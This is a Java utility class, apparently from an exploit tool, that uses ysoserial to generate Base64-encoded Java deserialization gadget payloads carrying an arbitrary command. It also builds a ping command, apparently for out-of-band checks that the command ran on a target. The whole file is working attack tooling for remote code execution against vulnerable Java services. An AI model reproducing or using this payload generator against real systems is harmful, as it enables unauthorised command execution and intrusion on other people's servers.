package io.github.exp1orer.util;

import com.unboundid.util.Base64;
import ysoserial.Serializer;
import ysoserial.payloads.ObjectPayload;

public class GeneratePayload {
    public static String getPayload(String payloadType, String command) {
        if (payloadType == null || command == null) {
            return null;
        }

        Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass(payloadType);
        if (payloadClass == null) {
            System.out.println("[-] Not support " + payloadType + " gadget.");
            return null;
        }

        try {
            final ObjectPayload payload = payloadClass.newInstance();
            final Object object = payload.getObject(command);
            byte[] serialize = Serializer.serialize(object);
            return Base64.encode(serialize);
        } catch (Throwable e) {
            e.printStackTrace();
        }

        return null;
    }

    public static String formatCommand(final String oldCommand) {
        if (oldCommand.startsWith("ping=")) {
            String[] split = oldCommand.split("=");
            String key = split[0];
            String value = split[1];
            if ("ping".equalsIgnoreCase(key)) {
                return String.format("ping -nc 1 %s", value);
            }
        }

        return oldCommand;
    }
}
